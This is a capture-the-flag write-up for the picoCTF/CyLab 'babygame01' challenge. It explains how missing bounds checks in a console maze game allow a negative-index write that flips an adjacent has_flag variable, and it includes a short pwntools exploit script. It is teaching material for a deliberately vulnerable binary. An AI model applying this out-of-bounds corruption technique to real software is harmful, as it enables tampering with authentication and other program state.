# CyLab / picoCTF — babygame01

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Logic)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 32-bit ELF (`game`) — console maze simulation  

---

## TL;DR

A clever 32-bit exploitation challenge demonstrating that memory corruption is not limited to buffer overflows or control flow hijacking. The binary implements an interactive 2D tile game where the player navigates an ASCII grid using `w`, `a`, `s`, and `d`. The game grid is stored as a 2D array on the stack, while a state variable `has_flag` resides in stack memory immediately preceding the array (`map[-4]`). Because user movements lack boundary verification, negative coordinate indexing permits an **Out-Of-Bounds (OOB) write**. Steering the player to coordinate `(0, -4)` overwrites `has_flag` with a non-zero character byte. Pressing `p` triggers the `solve_round()` routine and immediately prints the flag.

---

## Recon

We begin by examining the binary's file architecture and security mitigations using `file` and `checksec`:

```bash
$ file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

$ checksec game
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
* **File Type:** ELF 32-bit LSB (x86), dynamically linked, not stripped.
* **Canary:** `No canary found` — Stack canary validation is absent.
* **NX:** `NX enabled` — Direct shellcode execution on the stack is prevented.
* **PIE:** `No PIE (0x8048000)` — Executable base and function addresses are static.
* **Symbols:** Binary symbols are intact; functions like `move_player`, `solve_round`, and `main` are directly visible.

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

Decompiling the binary reveals the game initialization and main event loop:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char map[2403];        // [esp+14h] [ebp-A9Ch] BYREF
  int has_flag;          // [esp+977h] [ebp-139h] / [ebp-AA0h]
  int player_y;          // [esp+97Bh] [ebp-135h]
  int player_x;          // [esp+97Fh] [ebp-131h]
  char input_char;       // [esp+983h] [ebp-12Dh]

  init_game(&player_y, &player_x, map);
  has_flag = 0;
  while ( 1 )
  {
    print_map(map, player_y, player_x);
    input_char = getchar();
    if ( input_char == 'p' )
    {
      solve_round(map, player_y, player_x, has_flag);
    }
    else
    {
      move_player(&player_y, &player_x, input_char, map);
    }
  }
}
```

Examining `solve_round()`:
```c
int __cdecl solve_round(char *map, int player_y, int player_x, int has_flag)
{
  if ( has_flag )
  {
    puts("You won!");
    win();              // Reads and displays flag.txt
  }
  return 0;
}
```

### 2. Disassembly & Vulnerability Root Cause

Inspecting `move_player()`:
* Moving up (`'w'`) decrements `player_y` (`player_y--`).
* Moving left (`'a'`) decrements `player_x` (`player_x--`).
* Moving down (`'s'`) increments `player_y` (`player_y++`).
* Moving right (`'d'`) increments `player_x` (`player_x++`).

Crucially, `move_player()` writes the player tile `'@'` (ASCII `0x40`) or player character into `map[player_y * WIDTH + player_x]` **without validating if `player_x >= 0` or `player_y >= 0`**!

### 3. Stack Memory Layout & Negative Indexing

Disassembling `main` shows `has_flag` positioned at `[ebp-0xAA0]` while `map` begins at `[ebp-0xA9C]`:

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [ebp - 0xAA0] (has_flag integer)
  |          has_flag (4 bytes)       |
  +-----------------------------------+  <- [ebp - 0xA9C] (map[0][0])
  |                                   |
  |     map[27][89] 2D array          |
  |                                   |
  |   Initial position: (y=4, x=4)    |
  +-----------------------------------+  <- [ebp] (Saved EBP)
  Higher Memory Addresses
```

- Distance from `map` base to `has_flag`:
  $$\text{Offset} = (ebp - 0xAA0) - (ebp - 0xA9C) = -4 \text{ bytes}$$
- The player starts at position `(4, 4)`.
- Stepping up 4 times (`'w' * 4`) sets `player_y = 0`.
- Stepping left 8 times (`'a' * 8`) sets `player_x = 4 - 8 = -4`.
- The game evaluates `map[0 * WIDTH + (-4)]`, modifying the exact memory location of `has_flag` to a non-zero byte!

---

## Dynamic Analysis & Exploitation Strategy

### 1. Movement Calculation
1. Send `b"a" * 8` $\rightarrow$ decrements horizontal coordinate past zero to `-4`.
2. Send `b"w" * 4` $\rightarrow$ decrements vertical coordinate to `0`.
3. Position is now `(0, -4)` $\rightarrow$ `has_flag` is updated from `0` to a non-zero character.
4. Send `b"p"` $\rightarrow$ calls `solve_round()`, satisfies `has_flag != 0`, and prints the flag.

### 2. Network TTY Buffering Hurdle
The remote CyLab service runs behind a canonical mode terminal. If an exploit script reads game board updates after each single character, network latency or line-buffering causes the script to hang. Sending the entire sequence as a single newline-terminated payload (`b"a"*8 + b"w"*4 + b"p\n"`) guarantees instantaneous, reliable execution.

---

## Exploit

We implement the solution with `pwntools`:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — babygame01
Exploit: 2D Array OOB negative indexing into adjacent stack variable
"""

from pwn import *

context.arch = 'i386'
context.log_level = 'info'

EXE = "./game"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 36644)

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # Move to (0, -4) to corrupt has_flag, then press 'p' to trigger solve_round
    payload = b"a" * 8 + b"w" * 4 + b"p\n"
    p.sendline(payload)

    # Receive win output and flag
    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit delivers the command pipeline and captures the flag:

```text
You won!
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Array Bounds Validation**: In C, array indexing `arr[i]` translates directly to pointer arithmetic `*(arr + i)`. Negative indices access memory located before the buffer, leading to arbitrary memory corruption if boundaries are unchecked.
2. **Logic Corruptions vs Control Flow**: When binary protections like NX or PIE are active, overwriting an adjacent control variable (e.g., `is_admin`, `authenticated`, or `has_flag`) is significantly simpler and more robust than hijacking return addresses.
3. **Canonical Mode Synchronization**: Network challenges interfacing with console terminal games often buffer input per line. Batching command inputs into a single line avoids unnecessary interactive stalls.
